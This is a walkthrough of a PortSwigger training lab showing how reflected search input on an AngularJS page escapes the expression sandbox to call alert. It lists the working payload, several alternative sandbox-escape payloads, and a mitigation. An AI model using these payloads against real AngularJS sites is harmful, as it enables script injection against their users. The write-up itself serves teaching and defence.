# PortSwigger — DOM XSS in AngularJS Expression with Angle Brackets and Double Quotes HTML-Encoded

`Web Security Academy` • `Cross-Site Scripting` • `Apprentice`

## TL;DR

The search functionality reflects user input inside an AngularJS template context. Angle brackets and double quotes are HTML-encoded, blocking classic HTML tag injection. However, the page loads AngularJS and applies the `ng-app` directive to the document body, meaning any text node inside the page is treated as a potential AngularJS template. Double curly brace expressions (`{{ }}`) are evaluated as JavaScript by the AngularJS engine regardless of HTML encoding. The AngularJS sandbox prevents direct access to `window` globals such as `alert`, but it can be bypassed by climbing the prototype chain through a built-in scope method. The lab is solved by submitting `{{$on.constructor('alert(1)')()}}` in the search field.

**Lab URL:** `https://YOUR-LAB-ID.web-security-academy.net/`

---

## Challenge Description

> This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality. AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded. To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the `alert` function.

**Context:**
- Difficulty: **Apprentice**
- Category: **Cross-Site Scripting — DOM-based**
- Goal: Execute an AngularJS expression that calls `alert(1)`

---

## Background — How AngularJS Templates Work

AngularJS is a JavaScript MVC framework that processes the DOM after page load. When it finds an element carrying the `ng-app` directive, it treats that element and all its descendants as an **AngularJS application**. Inside this scope, any text content wrapped in double curly braces is interpreted as an **AngularJS expression** and evaluated as JavaScript:

```html
<!-- AngularJS evaluates this and replaces it with "3" -->
<p>{{ 1 + 2 }}</p>

<!-- This calls a function and renders its return value -->
<p>{{ 'hello'.toUpperCase() }}</p>
```

This evaluation happens **entirely client-side**, driven by the AngularJS library — independently of what the server sends or how the server encodes the response. HTML-encoding `<` and `>` prevents the browser from interpreting injected HTML tags, but it does not affect `{{ }}` expression parsing, which operates at the JavaScript level after the HTML has already been parsed.

---

## Recon

### Step 1 — Identify the AngularJS context

Navigate to the lab and view the page source with `Ctrl+U`. Observe that the `<body>` tag carries the `ng-app` directive:

```html
<body ng-app>
```

This single attribute tells AngularJS to bootstrap an application over the entire page. Every text node in the document is now a candidate for template expression evaluation. Any `{{ }}` block that survives into the rendered DOM will be processed by AngularJS.

### Step 2 — Locate where input is reflected

Submit an arbitrary search term (e.g. `hello`) and inspect the source. The term is reflected inside the page body within an element that falls under `ng-app`:

```html
<h1>0 search results for 'hello'</h1>
```

The input appears as a plain text node, wrapped in no JavaScript context and not inside any HTML attribute. It is simply embedded in the HTML body — which is the AngularJS application root.

### Step 3 — Test angle bracket and double quote encoding

Submit a standard XSS probe:

```
<script>alert(1)</script>
```

Inspect the source:

```html
<h1>0 search results for '&lt;script&gt;alert(1)&lt;/script&gt;'</h1>
```

Angle brackets are HTML-encoded. Submit a double quote:

```
"test"
```

Inspect the source:

```html
<h1>0 search results for '&quot;test&quot;'</h1>
```

Double quotes are also HTML-encoded. Tag injection and attribute breakout are both blocked.

### Step 4 — Confirm AngularJS expression evaluation

Submit a basic arithmetic expression:

```
{{7*7}}
```

Inspect the rendered page (not the source — check what the browser **displays**):

```
0 search results for '49'
```

The expression `{{7*7}}` was evaluated by AngularJS and replaced with `49` in the rendered output. This confirms the injection point is inside an active AngularJS template context and that `{{ }}` expressions are executed.

### Step 5 — Confirm the sandbox blocks direct global access

Submit:

```
{{alert(1)}}
```

Nothing happens — no alert fires. AngularJS runs expressions inside a **sandboxed scope** that does not expose browser globals like `window`, `document`, or `alert` directly. Access to the global object must be obtained indirectly by escaping the sandbox.

---

## Understanding the Vulnerability

### The AngularJS sandbox

AngularJS expressions are not executed as raw JavaScript in the global scope. They run inside a restricted evaluator that:

- Operates on the **AngularJS scope object** (`$scope`), not on `window`
- Blocks direct references to `window`, `document`, `Function`, and other globals
- Strips access to the `__proto__` and `constructor` properties in some versions

The goal of the sandbox is to prevent template injection from becoming code execution. However, it has been broken multiple times across AngularJS versions through prototype chain traversal.

### The prototype chain escape

Every AngularJS scope object inherits from JavaScript's base `Object`. Built-in scope methods such as `$on`, `$emit`, and `$eval` are regular JavaScript functions. Every JavaScript function has a `.constructor` property pointing to the `Function` constructor — which can create and execute arbitrary JavaScript:

```javascript
// Standard JS — this is what the payload exploits:
var fn = new Function('alert(1)');
fn(); // executes alert(1)

// Equivalent via prototype chain:
someFunction.constructor('alert(1)')();
```

`$on` is a method on the AngularJS scope. Since it is a function, `$on.constructor` resolves to `Function`. From there, `Function('alert(1)')()` creates a new function from a string and immediately invokes it — bypassing the sandbox entirely because `Function` is the native constructor and executes in the global scope.

### Source → Sink data flow

```
location.search (search term)
    └── server reflects input into HTML body
            └── AngularJS template engine evaluates {{ }} expressions
                    └── $on.constructor('alert(1)')() executes in global scope
```

Unlike traditional DOM XSS, there is no explicit JavaScript sink like `document.write` or `innerHTML`. The sink here is the **AngularJS template engine itself**, which evaluates expressions found in text nodes — making this a client-side template injection (CSTI) vulnerability.

### Character encoding analysis

| Character | Encoded? | Impact |
|---|---|---|
| `<` | ✅ Yes → `&lt;` | HTML tag injection blocked |
| `>` | ✅ Yes → `&gt;` | HTML tag injection blocked |
| `"` | ✅ Yes → `&quot;` | HTML attribute breakout blocked |
| `'` | ❌ No | Not relevant — not inside a JS string |
| `{` | ❌ No | `{{ }}` expressions reach the DOM unencoded |
| `}` | ❌ No | `{{ }}` expressions reach the DOM unencoded |

The server correctly encodes characters that would enable HTML injection but leaves curly braces untouched — which is sufficient for AngularJS template injection.

---

## Exploitation

### The Payload

```
{{$on.constructor('alert(1)')()}}
```

### Step-by-step breakdown

| Fragment | Role |
|---|---|
| `{{` | Opens an AngularJS expression block |
| `$on` | Built-in AngularJS scope method — a regular JS function |
| `.constructor` | Resolves to the native `Function` constructor |
| `('alert(1)')` | Passes `'alert(1)'` as the function body string |
| `()` | Immediately invokes the newly created function |
| `}}` | Closes the AngularJS expression block |

### What the template engine evaluates

```javascript
// AngularJS resolves this expression on the scope:
$on.constructor('alert(1)')()

// Which is equivalent to:
Function('alert(1)')()

// Which executes:
alert(1)
```

### What appears in the source vs the rendered DOM

**Page source (server response):**
```html
<h1>0 search results for '{{$on.constructor('alert(1)')()`}}'</h1>
```

**Rendered DOM (after AngularJS processes the template):**
```html
<h1>0 search results for 'undefined'</h1>
```
*(The expression is replaced with its return value — `undefined` since `alert` returns nothing — and `alert(1)` has already fired.)*

### Step-by-step exploitation

1. Navigate to the lab URL
2. Type the following payload into the search field:
   ```
   {{$on.constructor('alert(1)')()}}
   ```
3. Click **Search**
4. AngularJS evaluates the expression on page load → `alert(1)` fires → **lab solved** ✅

### Execution Flow

```
Attacker submits: {{$on.constructor('alert(1)')()}}
        ↓
Server HTML-encodes < > " — curly braces pass through unmodified
        ↓
Browser parses the HTML response — no JS execution yet
        ↓
AngularJS bootstraps on <body ng-app>
        ↓
Template engine scans all text nodes for {{ }} blocks
        ↓
Expression found: $on.constructor('alert(1)')()
        ↓
$on resolved on the AngularJS scope → it is a Function
.constructor → native Function constructor
('alert(1)')() → new Function('alert(1)')() runs in global scope
        ↓
alert(1) executes
        ↓
LAB SOLVED ✅
```

---

## Alternative Payloads

Several other prototype chain paths lead to `Function` and achieve the same result. These variants are useful when `$on` is unavailable or patched:

```
{{constructor.constructor('alert(1)')()}}
```
Accesses `constructor` directly on the scope object, then `.constructor` again to reach `Function`.

```
{{'a'.constructor.fromCharCode===([]).join&&[1].map(alert)}}
```
A more obfuscated variant that avoids calling `alert` by name — useful when the string `alert` is being filtered.

```
{{[].pop.constructor('alert(1)')()}}
```
Uses `Array.prototype.pop` (a function) to reach `Function` via `.constructor`.

All variants share the same fundamental technique: find any **function reference** accessible from within the AngularJS scope, then use its `.constructor` property to obtain the native `Function` constructor.

---

## Client-Side Template Injection vs DOM XSS

| Property | DOM XSS | Client-Side Template Injection (CSTI) |
|---|---|---|
| Sink | DOM API (`innerHTML`, `document.write`, etc.) | Template engine evaluator |
| Trigger | JS assigns attacker input to a dangerous sink | Template engine evaluates attacker-controlled expression |
| Requires JS sink in source | ✅ Yes | ❌ No — the framework is the sink |
| HTML encoding defeats it | ✅ Sometimes | ❌ No — `{{ }}` is processed after HTML parsing |
| Scope of execution | Global (JS context) | Sandboxed (but escapable) |
| Framework-specific | ❌ No | ✅ Yes — payload depends on the framework |

CSTI is often miscategorised as standard XSS. The key distinction is that the vulnerability stems from **user input being treated as a template expression**, not from input being written into a dangerous DOM property. The server-side equivalent is Server-Side Template Injection (SSTI).

---

## Key Takeaways

- **HTML encoding is not sufficient when a template engine is in play** — encoding `<` and `>` prevents HTML tag injection but has no effect on `{{ }}` expressions processed by AngularJS after the HTML is parsed
- **`ng-app` on the document body means the entire page is a template** — any reflected input, anywhere in the body, becomes a potential template injection point
- **The AngularJS sandbox is not a security boundary** — it has been broken in virtually every version of AngularJS 1.x; prototype chain traversal via `.constructor` is the canonical escape technique
- **This is Client-Side Template Injection (CSTI), not traditional XSS** — the sink is the template engine itself; no `innerHTML`, `document.write`, or `eval` is required
- **The fix:** avoid reflecting untrusted input inside an AngularJS application root; if reflection is necessary, encode `{` and `}` characters server-side (`{` → `&#123;`, `}` → `&#125;`) so that curly brace sequences never reach the template engine intact. Alternatively, upgrade to Angular (v2+), which does not use the `{{ }}` template syntax in the same way and does not have the same sandbox escape surface

---

## References

- [PortSwigger — DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [PortSwigger — Client-side template injection](https://portswigger.net/web-security/cross-site-scripting/dom-based#client-side-template-injection)
- [PortSwigger — AngularJS sandbox escapes](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)
- [PortSwigger — XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP — DOM Based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [MDN — Function() constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function)
- [AngularJS — Security Guide](https://docs.angularjs.org/guide/security)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)